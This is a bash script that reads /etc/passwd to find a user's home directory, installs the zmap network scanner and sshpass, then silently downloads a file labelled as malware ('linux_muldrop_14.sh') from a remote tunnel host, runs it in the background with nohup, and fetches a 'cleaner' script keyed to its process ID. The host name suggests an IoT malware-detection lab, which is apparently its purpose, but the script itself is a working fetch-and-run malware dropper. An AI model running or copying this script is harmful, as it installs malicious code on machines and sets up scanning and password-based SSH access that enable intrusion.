#!/bin/bash

set -e

while IFS=: read -r username _ _ _ _ homedir _; do
    if [[ "$homedir" == "/home/"* ]]; then
        break
    fi
done < /etc/passwd



if ! which zmap >/dev/null
then 
    sudo apt-get update -y
    sudo apt-get upgrade -y
    sudo apt-get install build-essential cmake libgmp3-dev gengetopt libpcap-dev flex byacc libjson-c-dev pkg-config libunistring-dev -y
    git clone https://github.com/zmap/zmap.git /home/$username/zmap
    cd /home/$username/zmap
    cmake -DENABLE_HARDENING=ON .
    make
    sudo make install

fi

if ! which sshpass >/dev/null
then
  sudo apt-get install sshpass -y
fi


wget -q  "https://iotdet.eu.loclx.io/file/malware/9/executable/download/device" -O "/home/$username/linux_muldrop_14.sh"
chmod +x "/home/$username/linux_muldrop_14.sh"
nohup /home/$username/linux_muldrop_14.sh > /dev/null 2>&1 &


sleep 1
pid_code=$(pgrep -f "/home/$username/linux_muldrop_14.sh")

wget -q "https://iotdet.eu.loclx.io/file/malware/9/cleaner/download/device" -O "/home/$username/linux_muldrop_14_cleaner.py"
nohup python3 /home/$username/linux_muldrop_14_cleaner.py $pid_code > /dev/null 2>&1 &

